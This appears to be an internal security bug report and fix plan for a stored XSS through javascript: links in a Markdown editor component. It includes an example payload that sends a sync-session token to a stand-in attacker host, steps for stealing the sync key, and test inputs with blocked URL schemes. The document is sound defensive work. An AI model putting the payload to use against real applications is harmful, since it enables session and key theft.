# Stored XSS via `javascript:` URLs in `MarkdownEditor` edit path (SEC-000019 gap)

**Status:** DONE
**Bug ID:** SEC-000021
**Severity:** High

## Location

- `src/components/ui/MarkdownEditor.tsx`, lines 19–39 (`InnerEditor` — passes untrusted markdown into Milkdown's `defaultValueCtx` with no URL sanitisation, and the Milkdown editor remains editable so links render as real `<a>` DOM nodes)
- `src/components/packs/PackOptionsModal.tsx`, line 113 (`<MarkdownEditor value={description} onChange={setDescription} />` — `description` is initialised from `pack.manifest.description`, which is attacker-controlled after CDP import or sync-blob push)
- `src/components/chores/ChoreFormModal.tsx`, line 204 (same pattern for `chore.description`)
- Contrast: `src/components/ui/MarkdownDisplay.tsx` line 167 wraps content with `sanitizeMarkdownLinks(...)` before feeding it to Milkdown; `MarkdownEditor.tsx` line 25 does **not**.
- Underlying: `node_modules/@milkdown/preset-commonmark/lib/index.js` lines 316–319 — `linkSchema.toDOM = (mark) => ["a", { ...linkAttr, ...mark.attrs }]` spreads the raw `href` verbatim into the DOM.

## Description

### The gap left by SEC-000019

SEC-000019 patched `MarkdownDisplay` — the *read-only* markdown renderer — by running `sanitizeMarkdownLinks(content)` before handing the string to Milkdown. That fix explicitly deferred `MarkdownEditor.tsx` (the *edit* path):

> `MarkdownEditor.tsx` (edit path) is out of scope per report instructions.
> The `chore.description` and `pack.manifest.description` fields are also editable by the local user through `MarkdownEditor`. If a user pastes hostile markdown they got from a chat/email, the same exploit applies.

`MarkdownEditor` therefore still passes the raw description string straight into Milkdown:

```ts
// src/components/ui/MarkdownEditor.tsx
ctx.set(defaultValueCtx, value);       // ← untrusted markdown, no sanitisation
// no editorViewOptionsCtx override → editor is fully editable
```

Milkdown then parses `[click me](javascript:fetch('https://evil.example/x?k='+localStorage.getItem('sync-session-token')))` and emits a live `<a href="javascript:...">click me</a>` node inside the editor's contenteditable region.

### Why this is exploitable, not merely theoretical

The user reaches the edit dialog by clicking **Options → Pack Options** (or **Edit chore**) on any pack/chore whose description contains attacker-supplied markdown. Concrete sources of poisoned descriptions:

1. **CDP import.** `src/cdp/cdp-import.ts` lines 91 and 111–113 store `choreRaw.description` and `manifestRaw.description` verbatim after `jsYaml.load`. The JSON schema only enforces `"description": { "type": "string" }`. So the exact attack described in SEC-000019 (a public GitHub CDP with a `description` containing a `javascript:` link) still deposits the malicious markdown into IndexedDB — SEC-000019 only stopped it from firing on the **display** path, not on removal via edit.
2. **Sync-blob overwrite.** An attacker who has previously stolen or guessed a victim's sync key can push a modified encrypted blob to the sync server; the next `pull` writes the poisoned description into IndexedDB. This is a cross-device foothold — the victim who opens the edit dialog on any device is exposed.
3. **Encrypted or plain backup import.** `handleImport` in `ProfilePage.tsx` (lines 85–124) accepts `.zip` and `.enc` backup files, validates them against a JSON schema that permits any `description` string, and stores them.
4. **User paste.** A user copying markdown from a chat, email, or web search into the description field triggers the same code path — Milkdown's `parseDOM` for the link mark (line 306 of preset-commonmark) also has no scheme filter, so pasted HTML `<a href="javascript:...">` is preserved.

### Why editable Milkdown lets the link fire

The description dialog renders the editor DOM in the user's origin. The rendered node is a plain browser `<a href="javascript:...">`. In an editable ProseMirror instance the left-click default is to place the cursor, but every other navigation trigger still fires the URL:

- **Right-click → "Open Link in New Tab"** — the browser navigates the new tab to the URL. Chromium and Firefox both execute `javascript:` URIs opened this way; the JS runs in the opener's origin (i.e., the Tasks Harmony origin).
- **Middle-click / Ctrl-click / Cmd-click** — same navigation path, same result.
- **Keyboard access** — Tab-focus the anchor, press Enter; the browser navigates.
- **Accidental drag** — dragging the link and dropping it into the address bar / a bookmark and later opening it also fires the URL from the app origin (for the drag-into-address-bar case).

None of these paths require unusual attacker cooperation; a plausible-looking "Read the full guide" link is enough. There is no confirm/allowlist between the click and the origin-scoped JS execution.

### Payload and impact — identical to SEC-000019

Because JS executes in the Tasks Harmony origin, the payload has the same reach as SEC-000019:

- Extract the AES-256-GCM sync key: `credentials.ts` still generates the key with `extractable: true` (line 8–12), so `crypto.subtle.exportKey('raw', key)` on the IndexedDB `credentials` record hands the attacker permanent, device-spanning decryption access.
- Read `localStorage.getItem('sync-session-token')` for immediate sync-server access.
- Enumerate IndexedDB: profile (including email), all packs/chores/completions, XP history.
- `PUT` an attacker-controlled encrypted blob at `/sync/<syncToken>` to poison every other device on the next `pull`.

Compared to SEC-000019 (High), the delta is: the exploit requires the victim to open the **Edit** dialog rather than merely view the pack. That is one extra click on a page they explicitly navigate to for a common workflow (edit a pack imported from a CDP, or edit any chore whose description was ever received from outside). The credential-exfiltration outcome is unchanged.

### Why the current mitigation does not cover this

The `sanitizeMarkdownLinks` function exists and is proven correct (SEC-000019 test suite), but it is only invoked in `MarkdownDisplay.tsx`. `MarkdownEditor.tsx` never imports or calls it. The two call sites (`PackOptionsModal.tsx` line 113, `ChoreFormModal.tsx` line 204) both pass the raw stored description straight in.

Additionally, Milkdown's `parseDOM` for the link mark (`preset-commonmark/lib/index.js` line 306) accepts any `href` from pasted HTML with no scheme filter, so even a user who starts with a clean description can be tricked into pasting a malicious `<a>` into the editor and then re-open it later to trigger the same bug on themselves.

## Validation

**CONFIRMED — High severity.**

All technical claims were verified against the source code:

1. **Missing sanitisation in `MarkdownEditor.tsx` is real.** Line 25 sets `ctx.set(defaultValueCtx, value)` with the raw, unsanitised string. `sanitizeMarkdownLinks` is never imported or called anywhere in that file.

2. **The contrast with `MarkdownDisplay.tsx` is accurate.** Line 167 of `MarkdownDisplay.tsx` does `ctx.set(defaultValueCtx, sanitizeMarkdownLinks(content))` — the exact call that is absent from the editor.

3. **Both call sites pass unsanitised data directly.** `PackOptionsModal.tsx` line 113 and `ChoreFormModal.tsx` line 204 both pass raw `description` values from stored pack/chore records into `<MarkdownEditor>` with no sanitisation at the call site either.

4. **Attacker-controlled input paths are real.** CDP import (`cdp-import.ts` lines 91, 113) stores `choreRaw.description` and `manifestRaw.description` verbatim with no sanitisation. A malicious CDP repository can deposit a `javascript:` payload into IndexedDB, where it persists until the user explicitly edits or deletes the entry.

5. **Exploit is one additional click beyond SEC-000019.** The victim must open the Edit dialog, but that is a routine workflow for any imported pack. The `javascript:` link renders as a live `<a>` DOM node in the editable Milkdown ProseMirror instance. While a simple left-click places the cursor, right-click → "Open in New Tab", middle-click, Ctrl/Cmd+click, and keyboard Enter on the focused anchor all fire the URL in the app's origin without any confirmation prompt.

6. **Impact is equivalent to SEC-000019.** Successful exploitation gives an attacker: the exportable AES-256-GCM sync key (full cross-device decryption), the `sync-session-token` (immediate server write access), and all IndexedDB data (profile, packs, chores, completions, XP). This justifies **High** severity — same as SEC-000019 — because the extra click required to trigger it slightly reduces likelihood but does not meaningfully reduce impact.

7. **The user-paste vector (pasting a malicious `<a>` tag into the editor) is an additional plausible path** beyond the stored-description paths, and is independent of any import flow.

## Fix Plan

### Chosen approach: reuse `sanitizeMarkdownLinks` at the editor's `defaultValueCtx` seam

The same defence used in `MarkdownDisplay.tsx` (SEC-000019) applies here: rewrite unsafe URL schemes in the markdown source string before Milkdown parses it. Because `sanitizeMarkdownLinks` is already exported from `./MarkdownDisplay` and has a full test suite (see `src/components/ui/MarkdownDisplay.test.ts`), we import and reuse it — no duplicate logic, no follow-on maintenance surface.

**Why not just call `sanitizeMarkdownLinks(value)` inline and rely on the shared helper's existing tests?** Doing so would leave the *editor's own* invariant untested — nothing would fail if a future refactor silently dropped the call. To make the invariant testable in a `.test.ts` file without jsdom or a React renderer, we extract the pre-Milkdown transform into a tiny exported pure helper on `MarkdownEditor.tsx`:

```ts
// src/components/ui/MarkdownEditor.tsx
import { sanitizeMarkdownLinks } from './MarkdownDisplay';

/**
 * Pure transform applied to the incoming markdown value before it is handed to
 * Milkdown's defaultValueCtx. Exported for unit-testing (SEC-000021).
 * The editor is a live ProseMirror instance and renders live <a> DOM nodes,
 * so any unsafe href must be rewritten here for the same reasons as SEC-000019.
 */
export function sanitizeEditorValue(value: string): string {
  return sanitizeMarkdownLinks(value);
}
```

Then the config callback becomes:

```ts
ctx.set(defaultValueCtx, sanitizeEditorValue(value));
```

This shape mirrors the SEC-000019 fix (single seam, one call site, pure helper), stays out of Milkdown internals, and is stable across Milkdown upgrades.

**Rejected alternatives:**
- *Inline `sanitizeMarkdownLinks(value)` with no wrapper.* Cheaper, but the editor-side invariant would then only be indirectly tested via the shared helper — no test would catch removal of the call itself at this site. The one-line wrapper is worth the extra symbol.
- *Milkdown `linkAttr` / `linkSchema` override.* Rejected in SEC-000019 for the same reason: `mark.attrs` is spread after `linkAttr`, so the untrusted `href` still wins. Replacing the whole `linkSchema` is far outside the report scope.
- *Sanitise at every call site (`PackOptionsModal.tsx`, `ChoreFormModal.tsx`, ...).* Fragile — any new caller that forgets the wrapper reintroduces the bug. Fixing at the component boundary is the correct seam.

**Sanitising the outgoing `onChange` value is out of scope.** The report's confirmed exploit path is the *inbound* render (`defaultValueCtx`), where a pre-existing malicious description renders as a live `<a>` DOM node the moment the modal opens. A user *pasting* a fresh `javascript:` link into the editor is mentioned as an additional plausible vector; that is addressed indirectly because on the next open of the same record the sanitiser rewrites it before it can render as a live link. Adding an outbound sanitiser would double-write the store and change the on-save markdown behind the user's back — deferred as a follow-up if a report specifically calls out the paste-and-immediately-click path.

### Files touched

1. **`src/components/ui/MarkdownEditor.tsx`** — import `sanitizeMarkdownLinks` from `./MarkdownDisplay`, add exported pure helper `sanitizeEditorValue`, and replace `ctx.set(defaultValueCtx, value)` with `ctx.set(defaultValueCtx, sanitizeEditorValue(value))`.
2. **`src/components/ui/MarkdownEditor.test.ts`** *(new)* — unit tests for `sanitizeEditorValue` per the Test Plan below.

No changes to `PackOptionsModal.tsx` or `ChoreFormModal.tsx` — the fix lives at the component boundary.

### Test Plan

Follow the repo convention: pure-logic `.test.ts` file using `bun:test`, no jsdom, no React renderer (matches `src/components/ui/MarkdownDisplay.test.ts` and `src/components/ui/MarkdownToolbar.test.ts`).

- **File:** `src/components/ui/MarkdownEditor.test.ts` (new)
- **Primary test (the one that fails RED, passes GREEN):**
  - **Name:** `sanitizeEditorValue rewrites javascript: URLs before defaultValueCtx receives them`
  - **Assertion:**
    ```ts
    import { describe, it, expect } from 'bun:test';
    import { sanitizeEditorValue } from './MarkdownEditor';

    describe('MarkdownEditor - sanitizeEditorValue (SEC-000021)', () => {
      it('rewrites javascript: URLs before defaultValueCtx receives them', () => {
        expect(sanitizeEditorValue('[click me](javascript:alert(1))'))
          .toBe('[click me](about:blank#blocked)');
      });
    });
    ```
  - **RED expectation:** before the fix, `sanitizeEditorValue` does not exist — the import fails at load time and the test errors. This is the intended failure that proves the seam is present.
  - **GREEN:** after `sanitizeEditorValue` is exported and wraps `sanitizeMarkdownLinks`, the assertion passes.

- **Regression tests in the same file** (guard the invariant against future edits that break parity with `MarkdownDisplay`):
  - `blocks data: URLs` — `[x](data:text/html,<script>1</script>)` → `[x](about:blank#blocked)`
  - `blocks vbscript: URLs` — `[x](vbscript:msgbox("x"))` → `[x](about:blank#blocked)`
  - `blocks case-variant javascript: (JavaScript:, JAVASCRIPT:)` — parity with SEC-000019 test
  - `blocks whitespace/control-char smuggling in scheme` — `java\tscript:` / `java\nscript:` → blocked
  - `blocks javascript: inside autolinks <javascript:...>` — covers the paste-as-HTML autolink vector called out in the Description
  - `blocks javascript: inside reference-style link definitions` — `[id]: javascript:alert(1)` → `[id]: about:blank#blocked`
  - `preserves safe http(s), mailto, and relative links unchanged` — one assertion covering `https://…`, `http://…`, `mailto:a@b.c`, `/rel`, `#anchor`, `?q=1`
  - `leaves plain markdown without links unchanged` — `# Title\n\nA paragraph with **bold** and _italic_.` round-trips identically

These regression cases mirror `MarkdownDisplay.test.ts` so any future divergence between the display and edit seams surfaces as a failing test.
